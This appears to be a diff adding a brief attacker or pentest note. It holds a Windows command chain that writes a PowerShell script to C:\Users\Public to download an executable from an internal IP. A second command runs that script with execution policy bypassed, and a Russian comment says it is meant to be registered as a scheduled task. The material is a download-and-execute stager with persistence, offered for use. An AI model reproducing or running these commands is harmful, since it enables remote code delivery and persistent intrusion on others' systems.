@@ -1,0 +1,7 @@
+echo $storageDir = $pwd >> C:\Users\Public\wget.ps1 & echo $webclient = New-Object System.Net.WebClient >> C:\Users\Public\wget.ps1 & echo $url = "http://192.168.1.101/curl.exe" >> C:\Users\Public\wget.ps1 & echo $file = "output-file.exe" >> C:\Users\Public\wget.ps1 & echo $webclient.DownloadFile($url,$file) >> C:\Users\Public\wget.ps1 
+
+
+
+эта команда приписывается в schtacks (ниже)
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File C:\Users\Public\wget.ps1
